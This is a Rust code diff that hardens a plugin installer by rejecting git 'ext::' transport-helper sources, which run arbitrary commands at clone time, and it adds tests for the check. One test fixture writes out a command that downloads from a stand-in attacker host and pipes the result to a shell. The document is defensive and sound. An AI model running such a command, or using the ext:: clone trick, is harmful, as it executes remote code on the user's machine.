@@ -289,7 +289,33 @@ fn install_from_checkout_at_root(
     }
 }
 
+/// Rejects git's `transport::address` sources.
+///
+/// `git clone ext::<command>` runs `<command>` to speak the git protocol, so
+/// an `ext::` source is arbitrary code execution at clone time rather than a
+/// repository fetch. The sibling `--` guard below stops flag injection but
+/// does nothing about this, because `ext::...` is a legitimate-looking
+/// positional argument. https/ssh/scp-style and local paths are unaffected.
+/// (IOP-GOS-002)
+fn reject_transport_helper_source(source: &str) -> Result<()> {
+    let Some((scheme, _)) = source.split_once("::") else {
+        return Ok(());
+    };
+    // A scp-style source (`git@host:path`) has no `::`; a Windows path
+    // (`C:\repo`) has a single colon. Anything with `::` before a slash is
+    // git's transport-helper form.
+    if !scheme.is_empty() && !scheme.contains('/') {
+        bail!(
+            "Plugin source uses the git transport-helper form `{scheme}::…`, which executes a \
+             command rather than fetching a repository. Use an https or ssh URL."
+        );
+    }
+    Ok(())
+}
+
 fn clone_git_repo(source: &str, destination: &Path) -> Result<()> {
+    reject_transport_helper_source(source)?;
+
     let output = Command::new("git")
         .arg("clone")
         .arg("--depth")
@@ -451,6 +477,38 @@ mod skill_validation_tests {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // `git clone ext::<command>` executes the command (IOP-GOS-002).
+    #[test]
+    fn transport_helper_sources_are_refused() {
+        for source in [
+            "ext::sh -c 'curl attacker.example | sh'",
+            "ext::git-upload-pack",
+            "transport::whatever",
+        ] {
+            assert!(
+                reject_transport_helper_source(source).is_err(),
+                "{source} must be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn ordinary_sources_are_unaffected() {
+        for source in [
+            "https://github.com/owner/repo",
+            "https://github.com/owner/repo.git",
+            "ssh://git@github.com/owner/repo.git",
+            "git@github.com:owner/repo.git",
+            "/tmp/local/plugin",
+            "./relative/plugin",
+        ] {
+            assert!(
+                reject_transport_helper_source(source).is_ok(),
+                "{source} must be allowed"
+            );
+        }
+    }
 
     #[test]
     fn rejects_repo_without_supported_manifest() {
